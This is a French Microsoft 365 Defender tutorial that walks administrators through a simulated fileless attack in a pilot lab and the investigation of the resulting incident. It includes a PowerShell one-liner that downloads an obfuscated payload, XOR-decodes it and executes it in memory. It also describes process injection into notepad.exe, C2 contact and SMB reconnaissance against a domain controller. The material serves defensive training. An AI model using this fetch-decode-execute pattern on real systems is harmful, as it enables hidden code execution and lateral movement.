---
title: Exécuter une simulation d’attaque dans un environnement pilote Microsoft 365 Defender
description: Exécutez des simulations d’attaque pour Microsoft 365 Defender pour voir comment les alertes et les incidents sont présentés, les insights sont obtenus et les menaces sont rapidement corrigées.
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.service: microsoft-365-security
ms.subservice: m365d
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dansimp
author: dansimp
ms.date: 07/09/2021
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
- zerotrust-solution
- highpri
ms.custom: admindeeplinkDEFENDER
ms.topic: conceptual
ms.openlocfilehash: 59a227cc03a751e73470aff99e3fa04f490f7b7b
ms.sourcegitcommit: 10e6abe740e27000e223378eb17d657a47555fa8
ms.translationtype: MT
ms.contentlocale: fr-FR
ms.lasthandoff: 08/31/2022
ms.locfileid: "67473895"
---
# <a name="run-an-attack-simulation-in-a-microsoft-365-defender-pilot-environment"></a>Exécuter une simulation d’attaque dans un environnement pilote Microsoft 365 Defender


Cet article est [l’étape 1 sur 2](eval-defender-investigate-respond.md) dans le processus d’examen et de réponse d’un incident dans Microsoft 365 Defender à l’aide d’un environnement pilote. Pour plus d’informations sur ce processus, consultez l’article [de présentation](eval-defender-investigate-respond.md) .

Après avoir préparé votre [environnement pilote](eval-defender-investigate-respond.md), il est temps de tester la réponse aux incidents de Microsoft 365 Defender et les fonctionnalités automatisées d’investigation et de correction en créant un incident avec une attaque simulée et en utilisant le portail Microsoft 365 Defender pour examiner et répondre.

Un incident dans Microsoft 365 Defender est une collection d’alertes corrélées et de données associées qui composent l’histoire d’une attaque.

Les services et applications Microsoft 365 créent des alertes lorsqu’ils détectent un événement ou une activité suspect ou malveillant. Les alertes individuelles fournissent des indices précieux sur une attaque terminée ou en cours. Toutefois, les attaques utilisent généralement différentes techniques contre différents types d’entités, comme les appareils, les utilisateurs et les boîtes aux lettres. Le résultat est plusieurs alertes pour plusieurs entités dans votre client.

>[!Note]
>Si vous débutez avec l’analyse de la sécurité et la réponse aux incidents, consultez la procédure pas [à pas Répondre à votre premier incident](first-incident-overview.md) pour obtenir une visite guidée d’un processus classique d’analyse, de correction et de révision post-incident.
>

## <a name="simulate-attacks-with-the-microsoft-365-defender-portal"></a>Simuler des attaques avec le portail Microsoft 365 Defender

Le portail Microsoft 365 Defender dispose de fonctionnalités intégrées pour créer des attaques simulées sur votre environnement pilote :

- Exercice de simulation d'attaque pour Microsoft 365 Defender pour Office 365 à [https://security.microsoft.com/attacksimulator](https://security.microsoft.com/attacksimulator).
  
  Dans le portail Microsoft 365 Defender, sélectionnez **Email & > Exercice de simulation d'attaque de collaboration**.

- Didacticiels sur les attaques & simulations pour Microsoft 365 Defender pour point de terminaison à [https://security.microsoft.com/tutorials/simulations](https://security.microsoft.com/tutorials/simulations).

  Dans le <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">portail Microsoft 365 Defender</a>, sélectionnez Points de **terminaison > Didacticiels & simulations**.

### <a name="defender-for-office-365-attack-simulation-training"></a>Defender pour Office 365 Exercice de simulation d'attaque

Defender pour Office 365 avec Microsoft 365 E5 ou Microsoft Defender pour Office 365 Plan 2 inclut une formation de simulation d’attaque pour les attaques par hameçonnage. Les étapes de base sont les suivantes :

1. Créer une simulation

   Pour obtenir des instructions pas à pas sur la création et le lancement d’une simulation, consultez [Simuler une attaque par hameçonnage](/microsoft-365/security/office-365-security/attack-simulation-training).

2. Créer une charge utile

   Pour obtenir des instructions pas à pas sur la création d’une charge utile à utiliser dans une simulation, consultez [Créer une charge utile personnalisée pour l’entraînement de simulation d’attaque](/microsoft-365/security/office-365-security/attack-simulation-training-payloads).

3. Obtenir des insights

   Pour obtenir des instructions pas à pas sur la façon d’obtenir des insights avec la création de rapports, consultez [Obtenir des insights via l’entraînement de simulation d’attaque](/microsoft-365/security/office-365-security/attack-simulation-training-insights).

   > [!VIDEO https://www.microsoft.com/videoplayer/embed/RWMhvB]

Pour plus d’informations, consultez [Simulations](/microsoft-365/security/office-365-security/attack-simulation-training-get-started#simulations).

### <a name="defender-for-endpoint-attack-tutorials--simulations"></a>Didacticiels sur les attaques defender pour point de terminaison & simulations

Voici les simulations Defender pour point de terminaison de Microsoft :

- Document drops backdoor
- Investigation automatisée (porte dérobée)

Il existe des simulations supplémentaires provenant de sources tierces. Il existe également un ensemble de didacticiels.

Pour chaque simulation ou didacticiel :

1. Téléchargez et lisez le document pas à pas correspondant fourni.

2. Téléchargez le fichier de simulation. Vous pouvez choisir de télécharger le fichier ou le script sur l’appareil de test, mais ce n’est pas obligatoire.

3. Exécutez le fichier de simulation ou le script sur l’appareil de test, comme indiqué dans le document pas à pas.

 Pour plus d’informations, consultez [Expérience Microsoft Defender pour point de terminaison par le biais d’une attaque simulée](/microsoft-365/security/defender-endpoint/attack-simulations).

## <a name="simulate-an-attack-with-an-isolated-domain-controller-and-client-device-optional"></a>Simuler une attaque avec un contrôleur de domaine isolé et un appareil client (facultatif)

Dans cet exercice facultatif de réponse aux incidents, vous allez simuler une attaque sur un contrôleur de domaine services de domaine Active Directory isolé (AD DS) et un appareil Windows à l’aide d’un script PowerShell, puis examiner, corriger et résoudre l’incident.

Tout d’abord, vous devez ajouter des points de terminaison à votre environnement pilote.

### <a name="add-pilot-environment-endpoints"></a>Ajouter des points de terminaison d’environnement pilote

Tout d’abord, vous devez ajouter un contrôleur de domaine AD DS isolé et un appareil Windows à votre environnement pilote.

1. Vérifiez que votre locataire d’environnement pilote a [activé Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on).

2. Vérifiez que votre contrôleur de domaine :

   - Exécute Windows Server 2008 R2 ou une version ultérieure.
   - Rapports à [Microsoft Defender pour Identity](/azure/security-center/security-center-wdatp) et a activé [la gestion à distance](/windows-server/administration/server-manager/configure-remote-management-in-server-manager).
   - [L’intégration Microsoft Defender pour Identity et Microsoft Defender for Cloud Apps](/cloud-app-security/mdi-integration) est activée.
   - Un utilisateur de test est créé dans le domaine de test. Les autorisations au niveau de l’administrateur ne sont pas nécessaires.

3. Vérifiez que votre appareil de test :

   - Exécute Windows 10 version 1903 ou ultérieure.
   - Est joint au domaine du contrôleur de domaine AD DS.
   - [L’antivirus Microsoft Defender](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features) est activé. Si vous rencontrez des problèmes d’activation de l’antivirus Microsoft Defender, consultez cette [rubrique de résolution des problèmes](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-microsoft-defender-antivirus-is-not-disabled-by-a-policy).
   - Est [intégré à Microsoft Defender pour point de terminaison](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).

Si vous utilisez des groupes de locataires et d’appareils, créez un groupe d’appareils dédié pour l’appareil de test et envoyez-le au niveau supérieur.

Une alternative consiste à héberger votre contrôleur de domaine AD DS et votre appareil de test en tant que machines virtuelles dans les services d’infrastructure Microsoft Azure. Vous pouvez utiliser les instructions de la [phase 1 du guide de laboratoire de test d’entreprise simulé](/microsoft-365/enterprise/simulated-ent-base-configuration-microsoft-365-enterprise#phase-1-create-a-simulated-intranet), mais ignorer la création de la machine virtuelle APP1.

Voici le résultat.

:::image type="content" source="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-endpoints-tlg.png" alt-text="L’environnement d’évaluation à l’aide du guide de laboratoire de test d’entreprise simulé" lightbox="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-endpoints-tlg.png":::

Vous allez simuler une attaque sophistiquée qui utilise des techniques avancées pour se cacher de la détection. L’attaque énumère les sessions SMB (Server Message Block) ouvertes sur les contrôleurs de domaine et récupère les adresses IP récentes des appareils des utilisateurs. Cette catégorie d’attaques n’inclut généralement pas les fichiers supprimés sur l’appareil de la victime et se produisent uniquement en mémoire. Ils « vivent de la terre » à l’aide d’outils système et administratifs existants et injectent leur code dans les processus système pour masquer leur exécution. Ce comportement leur permet d’échapper à la détection et de persister sur l’appareil.

Dans cette simulation, notre exemple de scénario commence par un script PowerShell. Dans le monde réel, un utilisateur peut être trompé dans l’exécution d’un script ou le script peut s’exécuter à partir d’une connexion distante à un autre ordinateur à partir d’un appareil précédemment infecté, ce qui indique que l’attaquant tente de se déplacer latéralement dans le réseau. La détection de ces scripts peut être difficile, car les administrateurs exécutent également souvent des scripts à distance pour effectuer différentes activités d’administration.

:::image type="content" source="../../media/mtp/mtpdiydiagram.png" alt-text="Attaque PowerShell sans fichier avec injection de processus et attaque de reconnaissance SMB" lightbox="../../media/mtp/mtpdiydiagram.png":::

Pendant la simulation, l’attaque injecte le code shell dans un processus apparemment innocent. Le scénario nécessite l’utilisation de notepad.exe. Nous avons choisi ce processus pour la simulation, mais les attaquants cibleraient plus probablement un processus système de longue durée, tel que svchost.exe. Le code d’interpréteur de commandes contacte ensuite le serveur de commande et de contrôle (C2) de l’attaquant pour recevoir des instructions sur la procédure à suivre. Le script tente d’exécuter des requêtes de reconnaissance sur le contrôleur de domaine. La reconnaissance permet à un attaquant d’obtenir des informations sur les informations de connexion utilisateur récentes. Une fois que les attaquants disposent de ces informations, ils peuvent se déplacer latéralement dans le réseau pour accéder à un compte sensible spécifique

> [!IMPORTANT]
> Pour obtenir des résultats optimaux, suivez les instructions de simulation d’attaque aussi étroitement que possible.

### <a name="run-the-isolated-ad-ds-domain-controller-attack-simulation"></a>Exécuter la simulation d’attaque du contrôleur de domaine AD DS isolé

Pour exécuter la simulation de scénario d’attaque :

1. Vérifiez que votre environnement pilote inclut le contrôleur de domaine AD DS isolé et l’appareil Windows.

2. Connectez-vous à l’appareil de test avec le compte d’utilisateur de test.

3. Ouvrez une fenêtre Windows PowerShell sur l’appareil de test.

4. Copiez le script de simulation suivant :

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > Si vous ouvrez cet article sur un navigateur web, vous risquez de rencontrer des problèmes lors de la copie du texte intégral sans perdre certains caractères ou en introduisant des sauts de ligne supplémentaires. Si c’est le cas, téléchargez ce document et ouvrez-le sur Adobe Reader.

5. Collez et exécutez le script copié dans la fenêtre PowerShell.

> [!NOTE]
> Si vous exécutez PowerShell à l’aide du protocole RDP (Remote Desktop Protocol), utilisez la commande Type Clipboard Text dans le client RDP, car la touche d’accès rapide **CTRL-V** ou la méthode de clic droit-coller peut ne pas fonctionner. Parfois, les versions récentes de PowerShell n’acceptent pas cette méthode. Vous devrez peut-être d’abord la copier dans le Bloc-notes en mémoire, la copier sur la machine virtuelle, puis la coller dans PowerShell.

Quelques secondes plus tard, l’application Bloc-notes s’ouvre. Un code d’attaque simulé est injecté dans le Bloc-notes. Laissez l’instance du Bloc-notes générée automatiquement ouverte pour découvrir le scénario complet.

Le code d’attaque simulé tente de communiquer avec une adresse IP externe (simulant le serveur C2), puis tente une reconnaissance sur le contrôleur de domaine via SMB.

Ce message s’affiche sur la console PowerShell une fois ce script terminé :

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

Pour voir la fonctionnalité Incident et réponse automatisée en action, gardez le processus notepad.exe ouvert. Vous verrez l’incident et la réponse automatisés arrêter le processus du Bloc-notes.

### <a name="investigate-the-incident-for-the-simulated-attack"></a>Examiner l’incident pour l’attaque simulée

> [!NOTE]
> Avant de vous guider dans cette simulation, regardez la vidéo suivante pour voir comment la gestion des incidents vous aide à rassembler les alertes associées dans le cadre du processus d’investigation, où vous pouvez la trouver dans le portail et comment elle peut vous aider dans vos opérations de sécurité :

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

En basculant vers le point de vue de l’analyste SOC, vous pouvez maintenant commencer à examiner l’attaque dans le portail Microsoft 365 Defender.

1. Ouvrez le <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">portail Microsoft 365 Defender</a>.

2. Dans le volet de navigation, sélectionnez **Incidents & Alertes > Incidents**.

3. Le nouvel incident pour l’attaque simulée s’affiche dans la file d’attente des incidents.

   :::image type="content" source="../../media/mtp/fig2.png" alt-text="Exemple de file d’attente d’incidents" lightbox="../../media/mtp/fig2.png":::

#### <a name="investigate-the-attack-as-a-single-incident"></a>Examiner l’attaque en tant qu’incident unique

Microsoft 365 Defender met en corrélation l’analytique et agrège toutes les alertes et investigations associées de différents produits en une seule entité d’incident. Ce faisant, Microsoft 365 Defender montre une histoire d’attaque plus large, permettant à l’analyste SOC de comprendre et de répondre aux menaces complexes.

Les alertes générées pendant cette simulation sont associées à la même menace et, par conséquent, sont automatiquement agrégées en tant qu’incident unique.

Pour afficher l’incident :

1. Ouvrez le <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">portail Microsoft 365 Defender</a>.

2. Dans le volet de navigation, sélectionnez **Incidents & Alertes > Incidents**.

3. Sélectionnez l’élément le plus récent en cliquant sur le cercle situé à gauche du nom de l’incident. Un panneau latéral affiche des informations supplémentaires sur l’incident, y compris toutes les alertes associées. Chaque incident a un nom unique qui le décrit en fonction des attributs des alertes qu’il inclut.

   Les alertes affichées dans le tableau de bord peuvent être filtrées en fonction des ressources de service : Microsoft Defender pour Identity, Microsoft Defender for Cloud Apps, Microsoft Defender pour point de terminaison, Microsoft 365 Defender et Microsoft Defender pour Office 365.

3. Sélectionnez **Ouvrir la page d’incident** pour obtenir plus d’informations sur l’incident.

   Dans la page **Incident** , vous pouvez voir toutes les alertes et informations relatives à l’incident. Les informations incluent les entités et les ressources impliquées dans l’alerte, la source de détection des alertes (par exemple, Microsoft Defender pour Identity ou Microsoft Defender pour point de terminaison) et la raison pour laquelle elles ont été liées. L’examen de la liste des alertes d’incident montre la progression de l’attaque. Dans cette vue, vous pouvez voir et examiner les alertes individuelles.

   Vous pouvez également cliquer sur **Gérer l’incident** dans le menu de droite pour baliser l’incident, l’attribuer à vous-même et ajouter des commentaires.

#### <a name="review-generated-alerts"></a>Passer en revue les alertes générées

Examinons quelques-unes des alertes générées pendant l’attaque simulée.

> [!NOTE]
> Nous allons parcourir seulement quelques-unes des alertes générées pendant l’attaque simulée. Selon la version de Windows et les produits Microsoft 365 Defender s’exécutant sur votre appareil de test, vous pouvez voir d’autres alertes qui apparaissent dans un ordre légèrement différent.

:::image type="content" source="../../media/mtp/fig6.png" alt-text="Exemple d’alerte générée" lightbox="../../media/mtp/fig6.png":::

##### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint"></a>Alerte : Injection de processus suspecte observée (Source : Microsoft Defender pour point de terminaison)

Les attaquants avancés utilisent des méthodes sophistiquées et furtifs pour conserver la mémoire et se cacher des outils de détection. Une technique courante consiste à opérer à partir d’un processus système approuvé plutôt qu’un exécutable malveillant, ce qui rend difficile pour les outils de détection et les opérations de sécurité de repérer le code malveillant.

Pour permettre aux analystes SOC d’intercepter ces attaques avancées, des capteurs de mémoire profonde dans Microsoft Defender pour point de terminaison fournir à notre service cloud une visibilité sans précédent sur une variété de techniques d’injection de code interprocessus. La figure suivante montre comment Defender pour point de terminaison a détecté et alerté lors de la tentative d’injection de code pour <i>notepad.exe</i>.

:::image type="content" source="../../media/mtp/fig7.png" alt-text="Exemple d’alerte pour l’injection d’un code potentiellement malveillant" lightbox="../../media/mtp/fig7.png":::

##### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint"></a>Alerte : comportement inattendu observé par une exécution de processus sans arguments de ligne de commande (Source : Microsoft Defender pour point de terminaison)

Microsoft Defender pour point de terminaison détections ciblent souvent l’attribut le plus courant d’une technique d’attaque. Cette méthode garantit la durabilité et augmente la barre pour que les attaquants passent à des tactiques plus récentes.

Nous utilisons des algorithmes d’apprentissage à grande échelle pour établir le comportement normal des processus courants au sein d’une organisation et dans le monde entier et nous observons quand ces processus présentent des comportements anormaux. Ces comportements anormaux indiquent souvent que du code superflu a été introduit et s’exécute dans un processus autrement approuvé.

Pour ce scénario, le processus <i>notepad.exe</i> présente un comportement anormal, impliquant une communication avec un emplacement externe. Ce résultat est indépendant de la méthode spécifique utilisée pour introduire et exécuter le code malveillant.

> [!NOTE]
> Étant donné que cette alerte est basée sur des modèles Machine Learning qui nécessitent un traitement principal supplémentaire, cela peut prendre un certain temps avant de voir cette alerte dans le portail.

Notez que les détails de l’alerte incluent l’adresse IP externe, un indicateur que vous pouvez utiliser comme pivot pour développer l’investigation.

Sélectionnez l’adresse IP dans l’arborescence du processus d’alerte pour afficher la page de détails de l’adresse IP.

:::image type="content" source="../../media/mtp/fig8.png" alt-text="Exemple de comportement inattendu d’une exécution de processus sans arguments de ligne de commande" lightbox="../../media/mtp/fig8.png":::

La figure suivante affiche la page de détails de l’adresse IP sélectionnée (en cliquant sur l’adresse IP dans l’arborescence du processus d’alerte).

:::image type="content" source="../../media/mtp/fig9.png" alt-text="Exemple de page de détails d’adresse IP" lightbox="../../media/mtp/fig9.png":::

##### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a>Alerte : reconnaissance d’adresses UTILISATEUR et IP (SMB) (Source : Microsoft Defender pour Identity)

L’énumération à l’aide du protocole SMB (Server Message Block) permet aux attaquants d’obtenir des informations d’ouverture de session utilisateur récentes qui les aident à se déplacer latéralement via le réseau pour accéder à un compte sensible spécifique.

Dans cette détection, une alerte est déclenchée lorsque l’énumération de session SMB s’exécute sur un contrôleur de domaine.

:::image type="content" source="../../media/mtp/fig10.png" alt-text="Exemple d’alerte Microsoft Defender pour Identity pour la reconnaissance d’adresses IP et d’utilisateurs" lightbox="../../media/mtp/fig10.png":::

#### <a name="review-the-device-timeline-with-microsoft-defender-for-endpoint"></a>Passer en revue la chronologie de l’appareil avec Microsoft Defender pour point de terminaison

Après avoir exploré les différentes alertes de cet incident, revenez à la page d’incident que vous avez examinée précédemment. Sélectionnez l’onglet **Appareils** dans la page Incident pour passer en revue les appareils impliqués dans cet incident tels qu’ils sont signalés par Microsoft Defender pour point de terminaison et Microsoft Defender pour Identity.

Sélectionnez le nom de l’appareil sur lequel l’attaque a été effectuée pour ouvrir la page d’entité de cet appareil spécifique. Dans cette page, vous pouvez voir les alertes qui ont été déclenchées et les événements connexes.

Sélectionnez l’onglet **Chronologie** pour ouvrir la chronologie de l’appareil et afficher tous les événements et comportements observés sur l’appareil dans l’ordre chronologique, entrecoupés des alertes déclenchées.

:::image type="content" source="../../media/mtp/fig11.png" alt-text="Exemple de chronologie de l’appareil avec des comportements" lightbox="../../media/mtp/fig11.png":::

L’extension de certains des comportements les plus intéressants fournit des détails utiles, tels que les arbres de traitement.

Par exemple, faites défiler vers le bas jusqu’à ce que vous trouviez l’événement d’alerte **l’injection de processus suspecte observée**. Sélectionnez la **powershell.exe injectée pour notepad.exe** événement de processus en dessous, afin d’afficher l’arborescence de processus complète de ce comportement sous le graphique **d’entités d’événement** dans le volet latéral. Utilisez la barre de recherche pour le filtrage si nécessaire.

:::image type="content" source="../../media/mtp/fig12.png" alt-text="Exemple de l’arborescence de processus pour le comportement de création de fichiers PowerShell sélectionné" lightbox="../../media/mtp/fig12.png":::

#### <a name="review-the-user-information-with-microsoft-defender-for-cloud-apps"></a>Passer en revue les informations utilisateur avec Microsoft Defender for Cloud Apps

Dans la page d’incident, sélectionnez l’onglet **Utilisateurs** pour afficher la liste des utilisateurs impliqués dans l’attaque. Le tableau contient des informations supplémentaires sur chaque utilisateur, y compris le score de **priorité d’investigation** de chaque utilisateur.

Sélectionnez le nom d’utilisateur pour ouvrir la page de profil de l’utilisateur, où une investigation plus approfondie peut être effectuée. [En savoir plus sur l’examen des utilisateurs à risque](/cloud-app-security/tutorial-ueba#identify).

:::image type="content" source="../../media/mtp/fig13.png" alt-text="Page de l’utilisateur Defender pour Cloud Apps" lightbox="../../media/mtp/fig13.png":::

#### <a name="automated-investigation-and-remediation"></a>Investigation et résolution automatiques

> [!NOTE]
>Avant de vous guider dans cette simulation, regardez la vidéo suivante pour vous familiariser avec ce qu’est l’auto-guérison automatisée, où la trouver dans le portail et comment elle peut vous aider dans vos opérations de sécurité :

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

Revenez à l’incident dans le portail Microsoft 365 Defender. L’onglet **Investigations** de la page **Incident** affiche les enquêtes automatisées déclenchées par Microsoft Defender pour Identity et Microsoft Defender pour point de terminaison. La capture d’écran ci-dessous affiche uniquement l’investigation automatisée déclenchée par Defender pour point de terminaison. Par défaut, Defender pour point de terminaison corrige automatiquement les artefacts trouvés dans la file d’attente, ce qui nécessite une correction.

:::image type="content" source="../../media/mtp/fig14.png" alt-text="Exemple d’investigations automatisées liées à l’incident" lightbox="../../media/mtp/fig14.png":::

Sélectionnez l’alerte qui a déclenché une enquête pour ouvrir la page **détails de l’enquête** . Les détails suivants s’affichent :

- Alertes qui ont déclenché l’investigation automatisée.
- Utilisateurs et appareils concernés. Si des indicateurs sont trouvés sur des appareils supplémentaires, ces appareils supplémentaires sont également répertoriés.
- Liste des preuves. Entités trouvées et analysées, telles que les fichiers, les processus, les services, les pilotes et les adresses réseau. Ces entités sont analysées pour rechercher les relations possibles avec l’alerte et évaluées comme étant bénignes ou malveillantes.
- Menaces trouvées. Menaces connues détectées pendant l’enquête.

> [!NOTE]
> Selon le moment, l’investigation automatisée peut toujours être en cours d’exécution. Attendez quelques minutes que le processus se termine avant de collecter et d’analyser les preuves et d’examiner les résultats. Actualisez la page **détails de l’enquête** pour obtenir les derniers résultats.

:::image type="content" source="../../media/mtp/fig15.png" alt-text="Exemple de page Détails de l’enquête" lightbox="../../media/mtp/fig15.png":::

Au cours de l’enquête automatisée, Microsoft Defender pour point de terminaison identifié le processus de notepad.exe, qui a été injecté comme l’un des artefacts nécessitant une correction. Defender pour point de terminaison arrête automatiquement l’injection de processus suspects dans le cadre de la correction automatisée.

Vous pouvez voir <i>notepad.exe</i> disparaître de la liste des processus en cours d’exécution sur l’appareil de test.

#### <a name="resolve-the-incident"></a>Résoudre l’incident

Une fois l’enquête terminée et confirmée comme corrigée, vous résolvez l’incident.

Dans la page **Incident** , sélectionnez **Gérer l’incident**. Définissez l’état pour **résoudre l’incident** et sélectionnez **l’alerte True** pour la classification et le **test de sécurité** pour la détermination.

:::image type="content" source="../../media/mtp/fig16.png" alt-text="Exemple de page Incidents avec le panneau Gérer les incidents ouvert où vous pouvez cliquer sur le commutateur pour résoudre l’incident" lightbox="../../media/mtp/fig16.png":::

Lorsque l’incident est résolu, il résout toutes les alertes associées dans le portail Microsoft 365 Defender et les portails associés.

Cela inclut les simulations d’attaque pour l’analyse des incidents, l’investigation automatisée et la résolution des incidents.

## <a name="next-step"></a>Étape suivante

[:::image type="content" source="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png" alt-text="Fonctionnalités de réponse aux incidents Microsoft 365 Defender" lightbox="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png":::](eval-defender-investigate-respond-additional.md)

Étape 2 sur 2 : [Essayer Microsoft 365 Defender fonctionnalités de réponse aux incidents](eval-defender-investigate-respond-additional.md)

### <a name="navigation-you-may-need"></a>Navigation dont vous aurez peut-être besoin

[Créer l’environnement d’évaluation Microsoft 365 Defender](eval-create-eval-environment.md)
